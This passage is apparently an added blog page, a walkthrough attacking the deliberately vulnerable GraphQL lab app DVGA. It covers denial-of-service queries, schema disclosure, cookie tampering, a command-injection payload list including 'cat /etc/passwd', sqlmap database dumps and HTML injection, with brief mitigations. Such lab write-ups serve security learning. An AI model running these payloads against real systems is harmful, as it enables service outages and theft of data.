+&lt;a href=&#34;https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql&#34;&gt;https://gist.githubusercontent.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da/raw/e50819812a7a8a95b303ac0ea1464e2679e3e4bc/introspection-query.graphql&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Because the response of introspecion is overwhelming, We use &lt;a href=&#34;https://ivangoncharov.github.io/graphql-voyager/&#34;&gt;GraphQL-voyager&lt;/a&gt;. for &lt;em&gt;nodes&lt;/em&gt; and &lt;em&gt;edges&lt;/em&gt; view&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;copy the response data and paste it into Graphql-voyager’s editor.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;we should also check if the &lt;em&gt;GraphiQL&lt;/em&gt; is enabled. which allows constructing queries in a friendly user interface.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;GraphiQL is usually found in paths such as: /graphiql or __graphiql&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;iv---dos&#34;&gt;IV - DoS&lt;/h2&gt;
+&lt;h3 id=&#34;1---batch-queries&#34;&gt;1 - Batch Queries&lt;/h3&gt;
+&lt;p&gt;we can only send it using &lt;em&gt;Burp&lt;/em&gt; or &lt;em&gt;curl&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;query&amp;#34;&lt;/span&gt; :&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;query {systemHealth }&amp;#34;&lt;/span&gt; },
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;query&amp;#34;&lt;/span&gt; :&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;query {systemHealth }&amp;#34;&lt;/span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;this shows that batch queries are enabled&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;:{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;systemHealth&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;System Load: 0.00\n&amp;#34;&lt;/span&gt;}},{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;:{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;systemHealth&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;System Load: 0.00\n&amp;#34;&lt;/span&gt;}}]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now you can send 100 queries and overload the system&lt;/p&gt;
+&lt;h3 id=&#34;2---deep-recursion-query-attack&#34;&gt;2 - Deep recursion query attack&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;PasteObject&lt;/code&gt; and &lt;code&gt;OwnerObject&lt;/code&gt; cross reference each other so let’s use that.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Automatically&lt;/strong&gt; detect circular relationships in the schema:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;inql &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;graphql &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;generate&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;cycles &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;o dvga_cycles
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This confirms what we found in GraphQL Voyager:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cat /tmp/dvga_cycles/127.0.0.1:5013
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cycles&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; OwnerObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;paste&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; PasteObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;owner&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; OwnerObject &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; OwnerObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;pastes&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; PasteObject -&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;owner&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;-&amp;gt; OwnerObject &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can then exhaust system ressources using &lt;a href=&#34;https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql&#34;&gt;Unsafe Circular Query&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Solution : the developper must set a value for &lt;code&gt;maxQueryDepth&lt;/code&gt;, determines how many query we can send in one request. For instance we can set &lt;code&gt;maxQueryDepth&lt;/code&gt;: 5&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;3---field-duplucation-attack&#34;&gt;3 - Field Duplucation Attack&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_29_011345.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;hero&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;tools&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;graphql&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;tools&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;Black&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Hat&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;GraphQL&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ch05&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;exploit_threaded_field_dup&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.1.26&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;graphql
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This makes the app unresponsive. You can interrup the script with &lt;code&gt;CTRL-C&lt;/code&gt; to get your shell back. And you will also need to restart DVGA on your target VM.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-check&#34; data-lang=&#34;ad-check&#34;&gt;title: Solution
+with **cost analysis** , this attack will not be as easy to carry out 
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;4---aliases-based-attack&#34;&gt;4 - Aliases Based attack&lt;/h3&gt;
+&lt;p&gt;GraphQL doesn’t like dealing with identical response keys and will generally complain if a query includes a given field name twice and you pass an argument with a different value for each.&lt;/p&gt;
+&lt;p&gt;The difference is that using aliases will sometimes be more efficient, especially if a field de-duplication middleware is implemented. Note that a specific query middleware is needed on the GraphQL server to detect the use of aliases.&lt;/p&gt;
+&lt;p&gt;This python one liner will generate a &lt;strong&gt;list of 1000 aliases&lt;/strong&gt; for you to crash the target&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;for i in range(0, 1000): print(&amp;#34;q&amp;#34;+str(i)+&amp;#34;:&amp;#34;+&amp;#34;systemUpdate&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5---circular-fragment&#34;&gt;5 - Circular fragment&lt;/h3&gt;
+&lt;p&gt;Here we are creating two fragments on the &lt;code&gt;PasteObject&lt;/code&gt; object style called &lt;code&gt;Start&lt;/code&gt; and &lt;code&gt;End&lt;/code&gt;, which call each other:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_29_012710.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This will crash server instantly&lt;/p&gt;
+&lt;p&gt;on a real target that uses a properly designed GraphQL engine, &lt;strong&gt;this attack should not work&lt;/strong&gt;. &lt;strong&gt;But Test IT !!!!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;v---information-disclosure&#34;&gt;V - Information Disclosure&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;__schema&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { name }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;mutation&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { name }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;subscription&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { name }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or for more schema infos :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;__schema&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      kind
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fields {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;mutation&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      kind
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fields {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;subscription&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt; { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      kind
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      fields {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;If &lt;strong&gt;Introspection is Disabled&lt;/strong&gt; you cant do this&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;So enumeration of fields and dynamic testing is required to understand the structure of the application.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Obtain GraphQL API schema even if the introspection is disabled&lt;/strong&gt;: &lt;a href=&#34;https://github.com/nikitastupin/clairvoyance&#34;&gt;clairvoyance&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;clairvoyance https://rickandmortyapi.com/graphql -o schema.json
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To get Docs in &lt;code&gt;/graphiql&lt;/code&gt; we need to do some &lt;strong&gt;Cookie Tampering&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Open browser dev-tools and change &lt;em&gt;Cookie&lt;/em&gt; &lt;code&gt;env = graphiql:disable&lt;/code&gt; to &lt;code&gt;env = graphiql:enable&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_29_015230.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1---graphql-field-suggestions&#34;&gt;1 - GraphQL Field Suggestions&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;we can query something random and the server will suggest valid fields with similar names :&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-graphql&#34; data-lang=&#34;graphql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;query&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;errors&amp;#34;&lt;/span&gt;: [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cannot query field \&amp;#34;system\&amp;#34; on type \&amp;#34;Query\&amp;#34;. Did you mean \&amp;#34;pastes\&amp;#34;, \&amp;#34;paste\&amp;#34;, \&amp;#34;systemUpdate\&amp;#34; or \&amp;#34;systemHealth\&amp;#34;?&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;locations&amp;#34;&lt;/span&gt;: [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;line&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;column&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;vi---command-injection&#34;&gt;VI - Command Injection&lt;/h2&gt;
+&lt;h3 id=&#34;1---fuzzing-for-command-injection&#34;&gt;1 - Fuzzing for Command Injection&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_144707.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Metacharacters:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;|
+||
+&amp;amp;
+&amp;amp;&amp;amp;
+&amp;#39;
+&amp;#34;
+;
+&amp;#39;&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Payloads:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;whoami
+id
+cat /etc/passwd
+uname -a
+{&amp;#34;$where&amp;#34;: &amp;#34;sleep(1000) &amp;#34;}
+;%00
+-- -
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Disable Payload Encoding for both payloads&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_144311.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Start &lt;em&gt;Cluster Bomb&lt;/em&gt; Attack
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_150346.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Look at resonses to see if there&amp;rsquo;s a command injection vector, since there is nothing,
+&lt;strong&gt;We test another Parameter&lt;/strong&gt;, here we succeded in 2nd attempt:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_150732.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can test for SQL injection by adding a &lt;code&gt;&#39;&lt;/code&gt; to the string.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_145555.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2---exploiting&#34;&gt;2 - Exploiting&lt;/h3&gt;
+&lt;p&gt;As we can see, we are able to perform sql injections in this string !&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_145806.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Copy as request and feed it to &lt;code&gt;sqlmap&lt;/code&gt; , you need to add &lt;code&gt;*&lt;/code&gt; in instead of &lt;code&gt;&#39;&lt;/code&gt; so that sqlmap procceses it&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_152154.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r req.txt -tables --batch
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_152751.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now]]dump the&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r request.txt -dbms&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sqlite -dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then check results in &lt;strong&gt;cli&lt;/strong&gt; or from &lt;strong&gt;files&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_152845.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;vii---xss-html-injection&#34;&gt;VII - XSS, HTML Injection&lt;/h2&gt;
+&lt;p&gt;We &lt;strong&gt;create&lt;/strong&gt; or &lt;strong&gt;import&lt;/strong&gt; a &lt;em&gt;paste&lt;/em&gt; and set public to true so that we get victims :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_162009.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The mutation have been accepted, we can go back to the website to check :
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_162227.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;we could similarly inject an html payload in content argument if the server is not sanitizing the request :&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;h1&amp;gt;hello!&amp;lt;/h1&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;viii---graphql-query-deny-list-bypass&#34;&gt;VIII - GraphQL Query Deny List Bypass&lt;/h2&gt;
+&lt;p&gt;Creating an &lt;strong&gt;allow-list&lt;/strong&gt; or &lt;strong&gt;deny-list&lt;/strong&gt; for GraphQL is a common technique to prevent malicious queries from being resolved by GraphQL.&lt;/p&gt;
